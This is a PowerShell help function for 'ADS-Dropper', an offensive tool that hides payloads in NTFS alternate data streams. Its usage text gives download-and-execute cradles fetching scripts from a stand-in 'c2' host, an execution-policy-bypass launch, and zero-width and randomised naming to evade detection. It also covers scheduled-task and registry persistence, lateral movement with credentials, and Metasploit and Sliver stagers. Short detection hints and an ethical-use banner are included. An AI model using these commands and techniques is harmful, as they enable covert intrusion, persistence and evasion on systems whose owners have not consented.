function Show-Help { 
    $helpText = @"
╔══════════════════════════════════════════════════════════════════════════╗
║                    ADS-Dropper v2.1 - Quick Reference                    ║
║                Two Workflows: Generate-and-Paste OR Direct Deploy        ║
╚══════════════════════════════════════════════════════════════════════════╝

──────────────────────────────────────────────────────────────────────────────
 🎯 WORKFLOW 1: Generate-and-Paste (RECOMMENDED - No File Uploads)
──────────────────────────────────────────────────────────────────────────────

On Linux (Kali):
    pwsh ./src/ADS-OneLiner.ps1 \
        -Payload "IEX(New-Object Net.WebClient).DownloadString('http://c2/b.ps1')" \
        -Encrypt -Randomize -ZeroWidthStreams -CreateDecoys 3 \
        -OutputFile payload.txt

On Windows Target:
    # Copy OPTION 1 from payload.txt and paste:
    powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64>

Result: No files uploaded, minimal footprint, LLM-compatible

──────────────────────────────────────────────────────────────────────────────
 🔧 WORKFLOW 2: Direct Deployment (Traditional - Requires File Upload)
──────────────────────────────────────────────────────────────────────────────

USAGE: 
    .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]

REQUIRED:
    -Payload <string|array>    Payload to deploy (command or @('file.ps1'))

OPTIONAL:
    -Targets <array>           Target hosts (default: @('localhost'))
    -Persist <array>           Persistence: task, reg, volroot
    -Randomize                 Randomize artifacts for evasion
    -Encrypt                   AES-256 encrypt payload
    -ZeroWidthStreams          Use invisible Unicode in stream names
    -ZeroWidthMode <mode>      single, multi, or hybrid
    -HybridPrefix <string>     Prefix for hybrid mode (e.g., Zone.Identifier)
    -CreateDecoys <int>        Number of decoy streams (0-10)
    -NoExec                    Stage without executing
    -Credential <PSCredential> Creds for remote deployment
    -GenerateOnly              Output config without deployment (for OneLiner)

QUICK START EXAMPLES:

  Local deployment (basic):
    .\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"

  Full stealth (RECOMMENDED):
    .\ADS-Dropper.ps1 -Payload `$c2Stager -Encrypt -Randomize -ZeroWidthStreams

  Multiple persistence methods:
    .\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')

  Lateral movement:
    `$cred = Get-Credential
    .\ADS-Dropper.ps1 -Payload `$payload -Targets @('dc01') -Credential `$cred

──────────────────────────────────────────────────────────────────────────────
 PERSISTENCE METHODS
──────────────────────────────────────────────────────────────────────────────

  task       Scheduled Task (admin required)
             └─ Triggers: Logon + periodic (every 5 min)
             └─ Path: \Microsoft\Windows\UX* or ...\UsbCeip

  reg        Registry Run Key (user or admin)
             └─ HKCU/HKLM:...\CurrentVersion\Run
             └─ Fallback if not admin

  volroot    Volume Root ADS (admin required, NOVEL)
             └─ Stores command in C:\:ads_*
             └─ No parent file, survives directory wipes

──────────────────────────────────────────────────────────────────────────────
 ZERO-WIDTH STEALTH
──────────────────────────────────────────────────────────────────────────────

  -ZeroWidthStreams          Enable invisible Unicode characters in stream names
  
  Modes:
    single   One invisible character (U+200B)
    multi    3-5 invisible characters
    hybrid   Legitimate prefix + invisible suffix (RECOMMENDED)
             Example: "Zone.Identifier" + U+200B

  -HybridPrefix <name>       Legitimate stream name to use as prefix
                             Common: Zone.Identifier, Summary, Comments

  -CreateDecoys <count>      Add benign decoy streams (0-10)
                             Creates: Zone.Identifier, Summary, Comments, Author

──────────────────────────────────────────────────────────────────────────────
 ENCRYPTION
──────────────────────────────────────────────────────────────────────────────

  -Encrypt enables AES-256 with machine-specific key (UUID+hostname)
  
  Pros: Prevents static analysis, evades content-based detection
  Cons: Requires PowerShell loader (more telemetry than VBScript)

──────────────────────────────────────────────────────────────────────────────
 RANDOMIZATION
──────────────────────────────────────────────────────────────────────────────

  -Randomize generates unique artifacts per deployment:
  
    File:    SystemCache.dat  →  CacheSvc.log or SouYlGxk
    Stream:  :syc_payload      →  :SmartScreen or :Zone.Identifier
    Loader:  app_log_a.vbs     →  app_log_kqmxyz.vbs
    Task:    UsbCeip           →  WinSAT_VNXEMY or a3f5b2c1-...

──────────────────────────────────────────────────────────────────────────────
 C2 FRAMEWORK EXAMPLES
──────────────────────────────────────────────────────────────────────────────

  Realm C2 (Imix agent):
    `$imix = Get-Content .\imix_stager.txt -Raw
    .\ADS-Dropper.ps1 -Payload `$imix -Encrypt -Randomize

  Metasploit:
    `$msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")'
    .\ADS-Dropper.ps1 -Payload `$msf -Persist @('task')

  Sliver:
    `$sliver = @('C:\payloads\sliver.ps1')
    .\ADS-Dropper.ps1 -Payload `$sliver -Encrypt

──────────────────────────────────────────────────────────────────────────────
 DETECTION & CLEANUP
──────────────────────────────────────────────────────────────────────────────

  Blue team detection:
    - Sysmon Event ID 15 (ADS creation)
    - Event ID 4698 (Task creation)
    - PowerShell: Get-ChildItem C:\ProgramData -Stream *

  Cleanup artifacts:
    .\tests\cleanup.ps1 -Targets @('localhost')

──────────────────────────────────────────────────────────────────────────────
 TESTING
──────────────────────────────────────────────────────────────────────────────

  Validation suite:
    .\tests\validate.ps1

  Manual verification:
    dir /r C:\ProgramData           # Show ADS
    schtasks /query /fo LIST        # Show tasks
    Get-Item C:\:ads_* 2>`$null     # Check volume root

──────────────────────────────────────────────────────────────────────────────
 MORE INFO
──────────────────────────────────────────────────────────────────────────────

  Full help:       Get-Help .\ADS-Dropper.ps1 -Full
  Examples:        Get-Help .\ADS-Dropper.ps1 -Examples
  Parameters:      Get-Help .\ADS-Dropper.ps1 -Parameter *
  OneLiner Usage:  See USAGE-GUIDE.md for ADS-OneLiner.ps1 workflow

  GitHub:     https://github.com/Qweary/Apparition-Delivery-System
  Blog:       https://qweary.github.io/blog

──────────────────────────────────────────────────────────────────────────────
 ⚠️  ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
──────────────────────────────────────────────────────────────────────────────
"@
    Write-Host $helpText -ForegroundColor Cyan
}
